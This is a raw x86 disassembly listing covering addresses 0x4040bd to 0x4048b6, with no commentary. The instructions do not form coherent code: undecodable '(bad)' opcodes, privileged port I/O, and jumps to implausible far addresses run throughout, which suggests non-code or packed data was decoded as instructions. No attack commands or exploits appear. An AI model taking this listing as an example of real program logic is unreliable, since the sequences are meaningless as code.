  4040bd:	push   es
  4040be:	mov    eax,ds:0xbaf9cd00
  4040c3:	dec    ebp
  4040c4:	add    ebx,DWORD PTR [edx+0x12]
  4040c7:	jmp    0x404140
  4040c9:	int    0xc2
  4040cb:	or     esi,DWORD PTR [ebp-0x167d9d55]
  4040d1:	popf   
  4040d2:	test   al,0xdc
  4040d4:	mov    esi,0x29fb0aeb
  4040d9:	stos   BYTE PTR es:[edi],al
  4040da:	dec    ebx
  4040db:	adc    ebx,DWORD PTR [edi+0x19]
  4040de:	test   BYTE PTR [edx-0x8],ch
  4040e1:	xor    al,0x1e
  4040e3:	and    BYTE PTR [eax+eax*2-0x2f55dc2b],cl
  4040ea:	jcxz   0x404079
  4040ed:	cdq    
  4040ee:	xor    eax,0xcc2b1987
  4040f3:	gs in  eax,0xa4
  4040f6:	xor    cl,cl
  4040f8:	outs   dx,DWORD PTR ds:[esi]
  4040f9:	mov    ss,WORD PTR [ebp+0x68]
  4040fc:	push   ss
  4040fd:	and    eax,0xeef5dff1
  404102:	jb     0x404178
  404104:	(bad)  
  404105:	jmp    0x5164:0x779481d6
  40410c:	mov    bl,0x50
  40410e:	aam    0x4c
  404110:	in     eax,0x31
  404112:	call   0xa81612bb
  404117:	cmp    al,0x20
  404119:	ror    esi,cl
  40411b:	(bad)  
  40411c:	sahf   
  40411d:	xchg   edx,eax
  40411e:	das    
  40411f:	adc    DWORD PTR [edi],esp
  404121:	repnz dec esp
  404123:	pusha  
  404124:	add    eax,0xe1d54022
  404129:	or     edi,DWORD PTR [ebx+0x1b6744c9]
  40412f:	sti    
  404130:	and    al,0xf6
  404132:	jmp    0x392692ed
  404137:	cwde   
  404138:	pushf  
  404139:	je     0x4040fc
  40413b:	popa   
  40413c:	dec    esi
  40413d:	fist   DWORD PTR [ebp-0x3b]
  404140:	mov    ah,0xb2
  404142:	lods   al,BYTE PTR ds:[esi]
  404143:	inc    eax
  404144:	push   es
  404145:	imul   ebp
  404147:	div    BYTE PTR [ebp-0x21]
  40414a:	fwait
  40414b:	jl     0x404183
  40414d:	push   ebp
  40414e:	pop    ebx
  40414f:	mov    dl,0x1e
  404151:	mov    BYTE PTR [eax+0x5f],ch
  404154:	mov    ah,0x60
  404156:	lock shr DWORD PTR fs:[edi-0x6ba5b539],1
  40415e:	pop    eax
  40415f:	push   es
  404160:	cwde   
  404161:	sbb    cl,BYTE PTR [edx+esi*1+0x5e51e9d4]
  404168:	imul   ebx,esp,0xffffffcd
  40416b:	push   eax
  40416c:	(bad)  
  40416d:	mov    al,fs:0x3fd7ba74
  404173:	(bad)  
  404174:	sar    DWORD PTR ds:0xf1a7e687,cl
  40417a:	sbb    eax,0xb69b167
  40417f:	outs   dx,DWORD PTR ds:[esi]
  404180:	aas    
  404181:	jl     0x4041d6
  404183:	aam    0x3b
  404185:	(bad)  
  404186:	and    al,0x9f
  404188:	adc    dh,BYTE PTR [ebp+0x4bdb7523]
  40418e:	push   esp
  40418f:	jge    0x404112
  404191:	scas   al,BYTE PTR es:[edi]
  404192:	rcl    DWORD PTR [esi+0x64],1
  404195:	lahf   
  404196:	(bad)  
  404197:	push   eax
  404198:	mov    bh,0x11
  40419a:	cld    
  40419b:	les    eax,FWORD PTR [ebx-0x287254]
  4041a1:	(bad)  
  4041a2:	lahf   
  4041a3:	pusha  
  4041a4:	and    eax,0xf44d5f40
  4041a9:	mov    ebp,0x9ff9ee5b
  4041ae:	push   ebp
  4041af:	das    
  4041b0:	bound  ebp,QWORD PTR [edx]
  4041b2:	(bad)  
  4041b3:	(bad)  
  4041b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b5:	cmove  edx,DWORD PTR [esi]
  4041b8:	dec    edi
  4041b9:	jmp    0x40423a
  4041bb:	mov    ch,0x20
  4041bd:	mov    bh,0x85
  4041bf:	dec    edi
  4041c0:	sbb    ecx,DWORD PTR ds:[ebx+0x75]
  4041c4:	out    0x3b,eax
  4041c6:	jp     0x40417a
  4041c8:	enter  0x725b,0x85
  4041cc:	pop    ds
  4041cd:	mov    dl,0x97
  4041cf:	mov    eax,ds:0x18471bcc
  4041d4:	loope  0x4041c8
  4041d6:	mov    cl,0xca
  4041d8:	pushf  
  4041d9:	icebp  
  4041da:	adc    ebx,DWORD PTR [eax-0x7c6c0eb5]
  4041e0:	jecxz  0x4041f0
  4041e2:	sbb    BYTE PTR [eax],0x98
  4041e5:	js     0x4041e5
  4041e7:	jmp    0xe85e87c5
  4041ec:	cs pop eax
  4041ee:	inc    ebx
  4041ef:	inc    edx
  4041f0:	jl     0x4041a7
  4041f2:	test   DWORD PTR fs:[esi+ebp*8+0x6629d2be],edx
  4041fa:	add    eax,ecx
  4041fc:	jge    0x404238
  4041fe:	cmp    eax,0xa1f9016d
  404203:	cmc    
  404204:	mov    esi,0xefb9281e
  404209:	rcl    BYTE PTR [ebp+0x4f],0xf2
  40420d:	mov    BYTE PTR [ecx],cl
  40420f:	iret   
  404210:	sbb    ah,0x30
  404213:	add    BYTE PTR [ebx-0xc],0xbf
  404217:	bound  edi,QWORD PTR [eax+edi*1]
  40421a:	xor    DWORD PTR [edi-0x4779089],eax
  404220:	xor    ebp,ebx
  404222:	fimul  WORD PTR [edi-0x34fc53c8]
  404228:	jmp    0x237fb348
  40422d:	mov    edx,0x9c655d02
  404232:	jp     0x404292
  404234:	(bad)  
  404235:	enter  0x2bd4,0xbf
  404239:	lods   al,BYTE PTR ds:[esi]
  40423a:	dec    esp
  40423b:	dec    ebx
  40423c:	rcl    DWORD PTR [ebx],cl
  40423e:	pop    es
  40423f:	mov    WORD PTR [edi-0x1085e14f],fs
  404245:	or     al,0x25
  404247:	ret    
  404248:	enter  0xc64b,0xa3
  40424c:	stc    
  40424d:	inc    esp
  40424e:	nop
  40424f:	jecxz  0x4042c3
  404251:	out    dx,al
  404252:	mov    ah,0xdf
  404254:	fimul  WORD PTR [ecx-0x72]
  404257:	and    ch,BYTE PTR [edx]
  404259:	pop    ecx
  40425a:	sub    eax,0xcd7bd323
  40425f:	retf   
  404260:	mov    al,ds:0xb812d7d4
  404265:	xor    al,0x9e
  404267:	div    BYTE PTR [esi]
  404269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40426a:	push   0x16
  40426c:	repz retf 0xf134
  404270:	and    eax,0x129a996d
  404275:	mov    fs,WORD PTR [ecx]
  404277:	inc    edi
  404278:	jno    0x4042df
  40427a:	in     al,dx
  40427b:	sub    ah,ah
  40427d:	xchg   esp,eax
  40427e:	cdq    
  40427f:	mov    dh,BYTE PTR ds:0x389b59b2
  404285:	rol    BYTE PTR [ebp+0x27],0x86
  404289:	mov    edx,0xb271f86e
  40428e:	mov    esi,0xce199f16
  404293:	pop    eax
  404294:	fisub  DWORD PTR [eax+0x654b9a9a]
  40429a:	pop    ss
  40429b:	stos   BYTE PTR es:[edi],al
  40429c:	retf   
  40429d:	xor    eax,ebx
  40429f:	sub    DWORD PTR [ebp+0x24],ebx
  4042a2:	dec    eax
  4042a3:	(bad)  
  4042a4:	(bad)  
  4042a6:	mov    ds:0x8f44876,eax
  4042ab:	jb     0x40427b
  4042ad:	rcr    eax,0x37
  4042b0:	mov    eax,0xddd49a7
  4042b5:	mov    eax,0xc308b4a2
  4042ba:	rcl    BYTE PTR [esi+0x5b89c65c],0x56
  4042c1:	mov    dl,0x2
  4042c3:	pop    edi
  4042c4:	xchg   edx,eax
  4042c5:	pop    es
  4042c6:	iret   
  4042c7:	mov    cl,0xea
  4042c9:	push   esp
  4042ca:	sbb    BYTE PTR [eax],bl
  4042cc:	loopne 0x40426c
  4042ce:	mov    cl,0xbc
  4042d0:	iret   
  4042d1:	or     ebp,DWORD PTR [ebx-0x65]
  4042d4:	and    DWORD PTR [eax+0x7b],0xb55bc196
  4042db:	sub    eax,0xd10f5c94
  4042e0:	sbb    al,0x2
  4042e2:	pop    ebp
  4042e3:	rol    ah,1
  4042e5:	pop    ds
  4042e6:	ds jno 0x404362
  4042e9:	fcomp  QWORD PTR [esi+0x4f]
  4042ec:	in     eax,dx
  4042ed:	xchg   ebp,eax
  4042ee:	mov    es,WORD PTR [esi+0x11736b18]
  4042f4:	push   0x0
  4042f6:	and    ah,BYTE PTR [ecx-0x5448c6b4]
  4042fc:	call   0x9d63bbc4
  404301:	pop    ebp
  404302:	xor    edi,eax
  404304:	dec    edx
  404305:	xor    edx,esp
  404307:	mov    ds:0x6286a78c,al
  40430c:	loop   0x404294
  40430e:	mov    edi,0xb6f0c201
  404313:	mov    edi,0x347f0f32
  404318:	push   ebx
  404319:	retf   0x8369
  40431c:	addr16 rol ebx,cl
  40431f:	sub    DWORD PTR [ecx],0x1077b5f
  404325:	xchg   esp,eax
  404326:	bound  ecx,QWORD PTR [edx]
  404328:	mov    ch,0xe1
  40432a:	mov    bh,0x0
  40432c:	xchg   DWORD PTR [ecx+edi*8-0x12e2a3e8],esp
  404333:	(bad)  
  404334:	xor    DWORD PTR [ecx-0x35796e40],ebp
  40433a:	mov    edx,0xd184029c
  40433f:	bound  ebp,QWORD PTR [esi-0x4f64a8a5]
  404345:	mov    bh,BYTE PTR [ebp-0x602205ae]
  40434b:	push   ebp
  40434c:	hlt    
  40434d:	fs jge 0x4043cd
  404350:	neg    DWORD PTR [eax-0x3951198c]
  404356:	lahf   
  404357:	mul    DWORD PTR [edx]
  404359:	push   edi
  40435a:	mov    ah,0xb
  40435c:	mov    DWORD PTR [edx],eax
  40435e:	mov    bh,0xd6
  404360:	and    eax,ebx
  404362:	mov    ebx,0x71556a40
  404367:	repnz push cs
  404369:	das    
  40436a:	sbb    bl,dl
  40436c:	je     0x4043cf
  40436e:	unpckhps xmm2,XMMWORD PTR [ebx]
  404371:	bound  ecx,QWORD PTR [edx-0x4c]
  404374:	out    dx,al
  404375:	inc    esi
  404376:	test   DWORD PTR ds:0x76c4ff8d,ebx
  40437c:	fcmovb st,st(0)
  40437e:	xchg   BYTE PTR [ecx+edi*8],al
  404381:	int    0x3a
  404383:	jmp    0xc6c3d88a
  404388:	push   ss
  404389:	hlt    
  40438a:	push   ss
  40438b:	and    edx,DWORD PTR [ebp-0x7cb12f2b]
  404391:	push   cs
  404392:	push   0xffffffad
  404394:	sub    esp,DWORD PTR [ebx-0x293e70bf]
  40439a:	inc    ebx
  40439b:	or     eax,0x6041edb9
  4043a0:	out    0x90,eax
  4043a2:	sbb    BYTE PTR [ebp+0x2b439bfd],0xa7
  4043a9:	ins    DWORD PTR es:[edi],dx
  4043aa:	mov    eax,ds:0xbcf7131d
  4043af:	loope  0x404365
  4043b1:	in     eax,dx
  4043b2:	jp     0x4043fa
  4043b4:	ficom  DWORD PTR [esi-0x15]
  4043b7:	mov    al,0xe2
  4043b9:	dec    edx
  4043ba:	or     DWORD PTR [eax-0x57b14b09],edx
  4043c0:	loopne 0x40439f
  4043c2:	test   BYTE PTR [eax],ah
  4043c4:	nop
  4043c5:	mov    ah,0x1f
  4043c7:	lods   eax,DWORD PTR ds:[esi]
  4043c8:	push   esi
  4043c9:	dec    edi
  4043ca:	loop   0x40443b
  4043cc:	cmp    ebx,DWORD PTR [esi]
  4043ce:	rcr    BYTE PTR [eax+ebp*1+0x5d],cl
  4043d2:	pop    ebp
  4043d3:	xor    DWORD PTR [esp+esi*8-0xe24c8b8],eax
  4043da:	mov    eax,0xd7a3057
  4043df:	mov    al,al
  4043e1:	sahf   
  4043e2:	xchg   ebx,eax
  4043e3:	xchg   esp,eax
  4043e4:	mov    esp,0xb8ea850c
  4043e9:	jmp    0x42de9b99
  4043ee:	jno    0x404411
  4043f0:	xor    al,0x30
  4043f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043f3:	xlat   BYTE PTR ds:[ebx]
  4043f4:	ret    0x7ba2
  4043f7:	adc    DWORD PTR [edx-0x3c],edx
  4043fa:	(bad)  
  4043fb:	out    dx,eax
  4043fc:	xchg   edx,eax
  4043fd:	xchg   ebx,eax
  4043fe:	mov    cl,0xe0
  404400:	xchg   esp,eax
  404401:	push   edi
  404402:	stos   DWORD PTR es:[edi],eax
  404403:	dec    ebp
  404404:	fs aaa 
  404406:	(bad)  
  404407:	jmp    0x4043ff
  404409:	xchg   esi,eax
  40440a:	call   0x97b1:0xbed32c98
  404411:	fbstp  TBYTE PTR [esi]
  404413:	shr    BYTE PTR [ebp+0x72],1
  404416:	xchg   edi,eax
  404417:	or     edi,eax
  404419:	sbb    al,0x59
  40441b:	mov    ds:0xd40255f3,eax
  404420:	scas   eax,DWORD PTR es:[edi]
  404421:	push   esi
  404422:	fistp  QWORD PTR ds:0xda0a5d9f
  404428:	adc    BYTE PTR [ecx],al
  40442a:	shl    BYTE PTR [ecx+0x19],1
  40442d:	cmp    eax,0x1336b689
  404432:	pop    ds
  404433:	outs   dx,BYTE PTR ds:[esi]
  404434:	jle    0x404425
  404436:	jmp    0x40446f
  404438:	mov    ds:0x3199f4ed,al
  40443d:	mov    al,0xb2
  40443f:	and    dl,BYTE PTR [eax+0xa919369]
  404445:	sub    eax,0xc28285f8
  40444a:	shl    BYTE PTR [eax],cl
  40444c:	push   cs
  40444d:	pop    ecx
  40444e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40444f:	mov    eax,ds:0x99f4b30e
  404454:	sbb    bh,BYTE PTR [ebp-0x69]
  404457:	dec    eax
  404458:	or     dl,bh
  40445a:	xor    al,0x2e
  40445c:	add    eax,0x848ffb97
  404461:	imul   ecx,ebp,0x25ad991a
  404467:	iret   
  404468:	mov    DWORD PTR [esi],ebp
  40446a:	sub    ebp,ecx
  40446c:	lock cli 
  40446e:	push   eax
  40446f:	mov    al,ds:0xf1871329
  404474:	mov    edi,0x71abfde7
  404479:	sub    BYTE PTR [ecx+edx*1+0x5fe32e86],0x96
  404481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404482:	fidiv  DWORD PTR [ebx]
  404484:	(bad)  
  404485:	xor    ah,cl
  404487:	inc    esp
  404488:	(bad)  [ebx]
  40448a:	std    
  40448b:	adc    ecx,esp
  40448d:	retf   
  40448e:	and    bl,dl
  404490:	daa    
  404491:	xchg   esp,eax
  404492:	push   esp
  404493:	aam    0x8d
  404495:	mov    edx,0x7f8a98d4
  40449a:	shl    BYTE PTR [esi],0xee
  40449d:	loopne 0x4044f7
  40449f:	fist   DWORD PTR fs:[edi+0x63]
  4044a3:	mov    ds:0x892e0df0,al
  4044a8:	xor    BYTE PTR ds:0x5a30c3d0,dl
  4044ae:	lods   eax,DWORD PTR ds:[esi]
  4044af:	test   esi,0x18145d63
  4044b5:	test   dl,dl
  4044b7:	je     0x40448d
  4044b9:	jno    0x404514
  4044bb:	mov    ds:0x5cc3d56e,eax
  4044c0:	and    bh,0x2d
  4044c3:	jg     0x40453d
  4044c5:	push   eax
  4044c6:	ret    0x2de0
  4044c9:	pop    edx
  4044ca:	lods   al,BYTE PTR ds:[esi]
  4044cb:	in     eax,0x81
  4044cd:	dec    ecx
  4044ce:	fs inc ebp
  4044d0:	xchg   ebp,eax
  4044d1:	add    edi,DWORD PTR [eax-0x64a065c6]
  4044d7:	cmp    BYTE PTR [ebx+0x2f7d76d0],dl
  4044dd:	push   ecx
  4044de:	cmp    esi,DWORD PTR [edi-0x5e]
  4044e1:	jmp    0x92a4:0x7ed6c82a
  4044e8:	sbb    bl,dl
  4044ea:	(bad)
  4044ef:	sub    DWORD PTR [eax+ebp*1-0x3a],esi
  4044f3:	into   
  4044f4:	pop    edi
  4044f5:	push   eax
  4044f6:	sbb    BYTE PTR [ecx+0x4e],0x21
  4044fa:	xchg   esi,eax
  4044fb:	mov    ch,0x1c
  4044fd:	jnp    0x404578
  4044ff:	jl     0x404512
  404501:	push   ss
  404502:	xor    BYTE PTR [eax-0x4688ddee],cl
  404508:	lods   eax,DWORD PTR ds:[esi]
  404509:	ror    DWORD PTR [esi-0x42],1
  40450c:	shl    ch,0xcb
  40450f:	or     al,0x32
  404511:	ds push eax
  404513:	pop    ebp
  404514:	std    
  404515:	jne    0x4044ad
  404517:	into   
  404518:	popa   
  404519:	dec    esp
  40451a:	pop    edi
  40451b:	and    dh,al
  40451d:	xchg   ebx,eax
  40451e:	sbb    BYTE PTR [edi-0x4c],0xfe
  404522:	(bad)  
  404523:	out    0xd9,al
  404525:	xchg   BYTE PTR [ebx+0x79],bl
  404528:	or     dh,ch
  40452a:	and    ebp,ebx
  40452c:	ds out 0x4d,eax
  40452f:	fwait
  404530:	inc    ebx
  404531:	inc    ebp
  404532:	xor    BYTE PTR [ebp+eiz*1-0x63716e1c],0x3f
  40453a:	cwde   
  40453b:	pop    eax
  40453c:	fstp   DWORD PTR [ebp+0xc]
  40453f:	imul   ebp,edi,0xffffffda
  404542:	and    esp,DWORD PTR [eax-0x13]
  404545:	aam    0x1
  404547:	ret    0x460f
  40454a:	and    DWORD PTR [ebp-0x690258f2],edx
  404550:	sbb    eax,0x24e247fc
  404555:	fxch   st(3)
  404557:	fst    QWORD PTR [edx+0x43b98113]
  40455d:	lock xor ecx,ebp
  404560:	lds    edi,FWORD PTR [ebx]
  404562:	inc    eax
  404563:	out    dx,al
  404564:	clc    
  404565:	sbb    al,0xb
  404567:	adc    al,BYTE PTR [ebp-0x21cdc8d3]
  40456d:	je     0x404540
  40456f:	pushf  
  404570:	dec    eax
  404571:	in     eax,0x13
  404573:	ror    BYTE PTR ds:0x930e99f4,0x2
  40457a:	add    ebp,DWORD PTR ds:0x3cedcd39
  404580:	inc    eax
  404581:	add    DWORD PTR [eax-0x495b6466],esi
  404587:	das    
  404588:	push   ebp
  404589:	jb     0x404586
  40458b:	test   DWORD PTR [ebp-0x501bbe3f],esp
  404591:	les    ebp,FWORD PTR [edx-0x61]
  404594:	push   edx
  404595:	and    DWORD PTR [edi],0x471e532f
  40459b:	sbb    eax,DWORD PTR [ebx]
  40459d:	xor    BYTE PTR [edx+0x422a07eb],bl
  4045a3:	or     bl,bh
  4045a5:	add    DWORD PTR [ecx-0x37],edx
  4045a8:	sbb    al,0xa
  4045aa:	jg     0x404557
  4045ac:	rcl    BYTE PTR [edi+0x4c],1
  4045af:	call   0xa96a:0xd4112604
  4045b6:	jo     0x40461f
  4045b8:	xchg   esp,eax
  4045b9:	mov    eax,ds:0xb1547b10
  4045be:	les    esi,FWORD PTR [esi-0x49ac4a2]
  4045c4:	sub    DWORD PTR [edi+0x48],ebp
  4045c7:	pop    eax
  4045c8:	add    bl,cl
  4045ca:	sub    esi,ebx
  4045cc:	adc    dl,BYTE PTR [ebx+0x1d]
  4045cf:	mov    ecx,0x3aa6a38
  4045d4:	push   esp
  4045d5:	xchg   ecx,eax
  4045d6:	fdiv   DWORD PTR [ebx-0x56]
  4045d9:	int3   
  4045da:	sbb    al,0x57
  4045dc:	test   al,0xac
  4045de:	(bad)  
  4045df:	int3   
  4045e0:	cld    
  4045e1:	dec    edi
  4045e2:	mov    bl,0xb3
  4045e4:	mov    ds:0xd1d9f0d2,al
  4045e9:	(bad)  
  4045eb:	jmp    0xf127493b
  4045f0:	int3   
  4045f1:	sbb    edx,DWORD PTR [ecx+0x6f]
  4045f4:	scas   eax,DWORD PTR es:[edi]
  4045f5:	adc    BYTE PTR [ecx+0x69],dh
  4045f8:	add    BYTE PTR [edx-0x1dbbe855],bl
  4045fe:	xlat   BYTE PTR ds:[ebx]
  4045ff:	inc    ebp
  404600:	pushf  
  404601:	lods   al,BYTE PTR ds:[esi]
  404602:	imul   ebx,DWORD PTR gs:[edi],0x699f6990
  404609:	ss retf 
  40460b:	std    
  40460c:	scas   al,BYTE PTR es:[edi]
  40460d:	pop    esp
  40460e:	into   
  40460f:	or     BYTE PTR [edx+ebx*1-0x7e],ah
  404613:	sbb    ebx,DWORD PTR [edi-0x7a]
  404616:	mov    BYTE PTR [eax],dl
  404618:	scas   al,BYTE PTR es:[edi]
  404619:	xchg   ebp,eax
  40461a:	cmp    DWORD PTR [esi+edx*2+0x76],ebp
  40461e:	gs pop ebp
  404620:	popf   
  404621:	fs pushf 
  404623:	imul   esi,ecx,0x6cb7eb91
  404629:	add    dh,BYTE PTR [eax+0x770d9215]
  40462f:	aam    0x91
  404631:	sbb    al,0x46
  404633:	(bad)  
  404634:	mov    ah,ch
  404636:	(bad)  
  404637:	stc    
  404638:	iret   
  404639:	inc    edi
  40463a:	inc    esi
  40463b:	call   FWORD PTR [esi]
  40463d:	push   ecx
  40463e:	xchg   ebp,eax
  40463f:	mov    ds:0x18eb1593,eax
  404644:	add    DWORD PTR [ecx+edi*2-0x13f76cc2],esp
  40464b:	jmp    0x404666
  40464d:	xchg   esp,eax
  40464e:	mov    WORD PTR [edx-0x5c0c610a],?
  404654:	(bad)  
  404655:	mov    dh,0x30
  404657:	adc    ch,bl
  404659:	adc    DWORD PTR [esi],ecx
  40465b:	or     BYTE PTR [ecx+eiz*1-0x1b349ccd],cl
  404662:	jg     0x4046cc
  404664:	int3   
  404665:	xlat   BYTE PTR ds:[ebx]
  404666:	(bad)  
  404667:	fisttp QWORD PTR [ebx+0x2a]
  40466a:	enter  0x21d4,0x94
  40466e:	pop    ss
  40466f:	js     0x4045fd
  404671:	mov    dl,0x6c
  404673:	daa    
  404674:	inc    eax
  404675:	push   esi
  404676:	loopne 0x4046e3
  404678:	adc    DWORD PTR [ebx],edx
  40467a:	icebp  
  40467b:	and    eax,0xb60fd20b
  404680:	jmp    0x1348:0xec4b0642
  404687:	enter  0xab83,0x12
  40468b:	in     eax,0xaf
  40468d:	push   cs
  40468e:	popf   
  40468f:	sub    edx,edx
  404691:	cmp    ch,BYTE PTR [esi]
  404693:	and    BYTE PTR [eax+0x4b87453b],0xd4
  40469a:	rol    DWORD PTR [esi-0x6d7abb07],1
  4046a0:	out    dx,eax
  4046a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a2:	jmp    0x4046da
  4046a4:	jl     0x4046fa
  4046a6:	xchg   ebx,eax
  4046a7:	cmp    dl,dh
  4046a9:	sti    
  4046aa:	mov    ch,0x42
  4046ac:	add    ebx,edx
  4046ae:	cli    
  4046af:	jl     0x404690
  4046b1:	dec    ebx
  4046b2:	or     bl,bh
  4046b4:	cld    
  4046b5:	inc    ebx
  4046b6:	sbb    eax,0x78f9215e
  4046bb:	shl    DWORD PTR [edx],1
  4046bd:	bound  eax,QWORD PTR ss:[esp+edx*1+0x2c17aa29]
  4046c5:	mov    ds:0x82921b2b,eax
  4046ca:	sub    bh,ch
  4046cc:	mov    ch,0xf1
  4046ce:	or     BYTE PTR [esi-0x62],al
  4046d1:	ins    DWORD PTR es:[edi],dx
  4046d2:	push   edi
  4046d3:	aad    0x5f
  4046d5:	rol    DWORD PTR [ecx+eax*8],1
  4046d8:	xchg   DWORD PTR [ebp-0x15],eax
  4046db:	jge    0x404718
  4046dd:	lods   eax,DWORD PTR ds:[esi]
  4046de:	add    al,0x94
  4046e0:	jecxz  0x404707
  4046e2:	xor    ah,BYTE PTR [ecx-0x63]
  4046e5:	pop    edi
  4046e6:	(bad)  
  4046e7:	push   ebx
  4046e8:	push   ebp
  4046e9:	pop    ebx
  4046ea:	(bad)  
  4046eb:	pusha  
  4046ec:	push   edi
  4046ed:	sub    ah,dh
  4046ef:	pusha  
  4046f0:	nop
  4046f1:	pop    eax
  4046f2:	mov    WORD PTR [esi+0x8ed7b22],gs
  4046f8:	pusha  
  4046f9:	cdq    
  4046fa:	cmp    esp,DWORD PTR [esi]
  4046fc:	mov    bl,0xec
  4046fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046ff:	adc    BYTE PTR [ebx-0x209625ec],0x4e
  404706:	addr16 pop esi
  404708:	xor    BYTE PTR [ebp+edx*1+0x73],0x46
  40470d:	pop    ebx
  40470e:	jnp    0x4046e3
  404710:	jne    0x4046de
  404712:	mov    eax,0xe2c214be
  404717:	test   DWORD PTR [edi-0x9],0x88248f30
  40471e:	xor    eax,0xaad96584
  404723:	mov    al,ds:0x489f3f44
  404728:	hlt    
  404729:	sar    BYTE PTR [esi-0x2b],cl
  40472c:	jg     0x404767
  40472e:	dec    esi
  40472f:	fsubr  st(2),st
  404731:	lahf   
  404732:	xchg   ecx,eax
  404733:	inc    ecx
  404734:	or     eax,0x4907cedb
  404739:	mov    ds:0xc54b33d4,eax
  40473e:	nop
  40473f:	dec    ecx
  404740:	rol    DWORD PTR [ebp+0x71],cl
  404743:	sub    eax,0x6a978dea
  404748:	push   cs
  404749:	cs xchg esp,eax
  40474b:	sbb    esi,DWORD PTR [bp+0x15]
  40474f:	xor    cl,dh
  404751:	sar    BYTE PTR [edx-0x14],1
  404754:	les    edx,FWORD PTR [ebx+edx*2+0x38]
  404758:	js     0x404790
  40475a:	sbb    al,0x11
  40475c:	enter  0x909c,0x96
  404760:	into   
  404761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404762:	(bad)  
  404763:	push   0x550bd3ff
  404768:	jl     0x404798
  40476a:	dec    ecx
  40476b:	stos   DWORD PTR es:[edi],eax
  40476c:	cmp    ch,BYTE PTR [eax+0x26028c15]
  404772:	fcomp  DWORD PTR [edx+0x31]
  404775:	ret    0x81e4
  404778:	mov    al,ds:0x75dcb6ff
  40477d:	mov    BYTE PTR [ecx],dl
  40477f:	mov    ebp,0x55b46e43
  404784:	mov    edi,0xa066e4b
  404789:	mov    dh,0x40
  40478b:	cs cmp eax,0x9f9533dd
  404791:	push   esi
  404792:	dec    edx
  404793:	retf   0x81a
  404796:	or     al,0x50
  404798:	push   0x12
  40479a:	add    ebp,DWORD PTR [eax-0x39]
  40479d:	mov    edi,0xd8570ff
  4047a2:	and    dh,bl
  4047a4:	shl    DWORD PTR [ecx+0x22aadb24],1
  4047aa:	clc    
  4047ab:	in     al,dx
  4047ac:	int3   
  4047ad:	and    eax,0x4f0b77b6
  4047b2:	xchg   ebp,eax
  4047b3:	nop
  4047b4:	shr    DWORD PTR [esi+0x3b423193],cl
  4047ba:	addr16 in eax,dx
  4047bc:	out    dx,eax
  4047bd:	aas    
  4047be:	inc    ebp
  4047bf:	in     eax,dx
  4047c0:	loopne 0x404761
  4047c2:	jmp    0x8373c765
  4047c7:	dec    edx
  4047c8:	fisttp QWORD PTR ds:0xe7fda77b
  4047ce:	sub    eax,0x610ae45c
  4047d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047d4:	xchg   edi,eax
  4047d5:	into   
  4047d6:	icebp  
  4047d7:	popf   
  4047d8:	pop    edx
  4047d9:	adc    al,0xf2
  4047db:	je     0x40480f
  4047dd:	add    eax,0x50536c6f
  4047e2:	cld    
  4047e3:	jl     0x404837
  4047e5:	out    dx,al
  4047e6:	test   eax,0xced6b5e8
  4047eb:	lds    esi,FWORD PTR [eax]
  4047ed:	mov    WORD PTR [ecx],fs
  4047ef:	les    esp,FWORD PTR [ecx+ecx*1+0x3a]
  4047f3:	jo     0x4047bf
  4047f5:	sti    
  4047f6:	stos   BYTE PTR es:[edi],al
  4047f7:	mov    WORD PTR [esi-0x73],cs
  4047fa:	scas   al,BYTE PTR es:[edi]
  4047fb:	ins    BYTE PTR es:[edi],dx
  4047fc:	push   0x924ba506
  404801:	push   edi
  404802:	inc    esi
  404803:	cmc    
  404804:	pop    ebx
  404805:	sbb    eax,0x9a8eb3a5
  40480a:	lahf   
  40480b:	push   0x3a
  40480d:	call   0xa396a555
  404812:	loop   0x4047b9
  404814:	cs (bad) 
  404816:	mov    eax,gs:0x2632f0da
  40481c:	fmul   QWORD PTR [ebp-0x227b8c6]
  404822:	dec    eax
  404823:	outs   dx,DWORD PTR ds:[esi]
  404824:	dec    ebx
  404825:	imul   ecx,DWORD PTR [esi+esi*8-0x63d8c52f],0xffffffb9
  40482d:	fisttp WORD PTR [esi+ebp*8]
  404830:	aam    0x4e
  404832:	sbb    DWORD PTR [esi-0x5b100c67],edx
  404838:	jbe    0x404822
  40483a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40483b:	add    al,0x1f
  40483d:	fs pop es
  40483f:	data16 or al,0x2e
  404842:	pop    ds
  404843:	scas   eax,DWORD PTR es:[edi]
  404844:	mov    ebx,0x1a0d445f
  404849:	int3   
  40484a:	sbb    eax,0x2e238d99
  40484f:	push   ebx
  404850:	sub    DWORD PTR [edx-0x6fbf1899],ebx
  404856:	fxch   st(5)
  404858:	inc    esi
  404859:	stc    
  40485a:	(bad)  
  40485b:	daa    
  40485c:	adc    esp,DWORD PTR [ecx+0xc]
  40485f:	xchg   ebx,eax
  404860:	pop    eax
  404861:	in     eax,dx
  404862:	sbb    al,0x5d
  404864:	bswap  ecx
  404866:	cmp    cl,BYTE PTR es:[edx+ebx*8-0x6c]
  40486b:	inc    edi
  40486c:	pop    esp
  40486d:	mov    edi,ebx
  40486f:	jmp    0x40486a
  404871:	mov    bl,BYTE PTR [eax+0x78b7d599]
  404877:	pop    ss
  404878:	fidiv  DWORD PTR [eax+0x294db9a4]
  40487e:	cmp    DWORD PTR [edi-0x7c58aa8b],ebx
  404884:	(bad)  
  404885:	sub    DWORD PTR ds:0x63e5547f,edi
  40488b:	and    ecx,ecx
  40488d:	jecxz  0x40482e
  40488f:	dec    esi
  404890:	fucomp st(7)
  404892:	sub    dl,BYTE PTR [ecx]
  404894:	mov    dh,0xdd
  404896:	dec    esp
  404897:	jmp    0x404841
  404899:	lock int3 
  40489b:	inc    ebx
  40489c:	sub    ebx,DWORD PTR [ebp+0x723f5ab0]
  4048a2:	das    
  4048a3:	je     0x404845
  4048a5:	xor    cl,BYTE PTR [eax-0x70c3eb1a]
  4048ab:	jmp    0x98fe8576
  4048b0:	jmp    0x70022020
  4048b5:	scas   al,BYTE PTR es:[edi]
  4048b6:	mov    esp,0xd020420e
